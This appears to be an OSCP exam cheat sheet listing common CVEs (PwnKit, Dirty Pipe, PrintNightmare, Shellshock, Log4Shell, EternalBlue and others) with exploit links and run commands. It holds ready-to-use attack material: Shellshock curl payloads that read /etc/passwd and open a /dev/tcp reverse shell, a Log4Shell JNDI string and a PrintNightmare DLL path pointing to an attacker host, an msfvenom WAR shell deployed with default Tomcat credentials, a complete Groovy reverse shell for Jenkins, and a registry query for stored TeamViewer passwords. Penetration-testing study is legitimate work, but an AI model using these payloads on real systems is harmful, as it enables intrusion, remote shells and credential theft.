# Common OSCP CVEs

**Author:** r0tn3x  
**Frequently encountered CVEs in OSCP exam and labs**

---

## 🐧 Linux Privilege Escalation CVEs

### CVE-2021-4034 - PwnKit (Polkit)
**Affected:** Polkit pkexec  
**Severity:** High  
**Description:** Local privilege escalation via pkexec  
**Exploit:** https://github.com/berdav/CVE-2021-4034

```bash
# Check if vulnerable
dpkg -l | grep polkit

# Compile and run
gcc exploit.c -o exploit
./exploit
```

---

### CVE-2021-3156 - Sudo Baron Samedit
**Affected:** Sudo < 1.9.5p2  
**Severity:** Critical  
**Description:** Heap-based buffer overflow in sudo  
**Exploit:** https://github.com/blasty/CVE-2021-3156

```bash
# Check version
sudo -V | head -1

# Exploit
./exploit
```

---

### CVE-2022-0847 - Dirty Pipe
**Affected:** Linux Kernel 5.8+  
**Severity:** High  
**Description:** Overwrite read-only files  
**Exploit:** https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

```bash
# Check kernel
uname -r

# Exploit
gcc exploit.c -o exploit
./exploit /etc/passwd
```

---

### CVE-2016-5195 - Dirty COW
**Affected:** Linux Kernel 2.6.22 - 4.8.3  
**Severity:** High  
**Description:** Race condition in memory subsystem  
**Exploit:** https://github.com/dirtycow/dirtycow.github.io

```bash
gcc -pthread exploit.c -o exploit -lcrypt
./exploit
```

---

## 🪟 Windows Privilege Escalation CVEs

### CVE-2021-1675 / CVE-2021-34527 - PrintNightmare
**Affected:** Windows Print Spooler  
**Severity:** Critical  
**Description:** RCE via Print Spooler service  
**Exploit:** https://github.com/cube0x0/CVE-2021-1675

```powershell
# Check if vulnerable
Get-Service -Name Spooler

# Exploit
.\CVE-2021-1675.ps1 -DLL \\attacker\share\shell.dll
```

---

### CVE-2020-0796 - SMBGhost
**Affected:** Windows 10 1903/1909, Server 2019  
**Severity:** Critical  
**Description:** SMBv3 compression buffer overflow  
**Exploit:** https://github.com/chompie1337/SMBGhost_RCE_PoC

```python
python3 exploit.py -ip 10.10.10.10
```

---

### CVE-2019-1388 - UAC Bypass
**Affected:** Windows 7/8/10, Server 2008/2012/2016/2019  
**Severity:** High  
**Description:** Certificate dialog UAC bypass  
**Exploit:** Manual exploitation via Certificate dialog

```
1. Run application as admin
2. Click "Show information about the publisher's certificate"
3. Click the link, open browser as SYSTEM
4. File > Save As > cmd.exe
```

---

### CVE-2018-8120 - Win32k Privilege Escalation
**Affected:** Windows 7/2008 R2  
**Severity:** High  
**Description:** NULL pointer dereference  
**Exploit:** https://github.com/unamer/CVE-2018-8120

```
.\CVE-2018-8120.exe
```

---

## 🌐 Web Application CVEs

### CVE-2019-18988 - TeamViewer Credentials
**Affected:** TeamViewer < 15.0  
**Severity:** High  
**Description:** Stored passwords in registry  
**Location:** `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version*`

```powershell
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v SecurityPasswordAES
```

---

### CVE-2014-6271 - Shellshock
**Affected:** Bash < 4.3  
**Severity:** Critical  
**Description:** Code injection via environment variables  
**Exploit:**

```bash
# Test
curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://target/cgi-bin/test.sh

# Reverse shell
curl -A "() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.10/4444 0>&1" http://target/cgi-bin/test.sh
```

---

### CVE-2021-44228 - Log4Shell
**Affected:** Log4j 2.0-2.14.1  
**Severity:** Critical  
**Description:** Remote code execution via JNDI lookup  
**Exploit:**

```bash
${jndi:ldap://attacker:1389/a}
```

---

### CVE-2017-0144 - EternalBlue (MS17-010)
**Affected:** Windows SMBv1  
**Severity:** Critical  
**Description:** SMBv1 buffer overflow  
**Exploit:** https://github.com/worawit/MS17-010

```bash
# Check vulnerability
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10

# Exploit (Metasploit)
use exploit/windows/smb/ms17_010_eternalblue
```

---

## 🔧 Service-Specific CVEs

### Tomcat Manager - Default Credentials
**Affected:** Apache Tomcat  
**Severity:** High  
**Default creds:** tomcat:tomcat, admin:admin  
**Exploit:**

```bash
# Upload WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f war -o shell.war

# Deploy via manager
curl -u tomcat:tomcat --upload-file shell.war http://10.10.10.10:8080/manager/text/deploy?path=/shell
```

---

### Jenkins - Script Console RCE
**Affected:** Jenkins with exposed Script Console  
**Severity:** Critical  
**Exploit:**

```groovy
String host="10.10.14.10";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## 📚 CVE Research Tools

### searchsploit
```bash
searchsploit apache 2.4
searchsploit -m 12345
```

### Exploit-DB
https://www.exploit-db.com/

### CVE Details
https://www.cvedetails.com/

### NVD
https://nvd.nist.gov/

---

## 🎯 OSCP Exam Tips

1. **Check kernel version first** - `uname -a` on Linux, `systeminfo` on Windows
2. **Search for known exploits** - searchsploit, Google
3. **Compile locally first** - Test before transferring
4. **Check architecture** - 32-bit vs 64-bit
5. **Read exploit code** - Understand what it does
6. **Try public exploits** - Before developing custom

---

## ⚠️ Disclaimer

**These CVEs are for educational purposes only. Only use on systems you have permission to test.**

---

**More exploits:** See [CVE/exploitdb/](exploitdb/) directory

**Author:** r0tn3x | OSCP+ December 2025
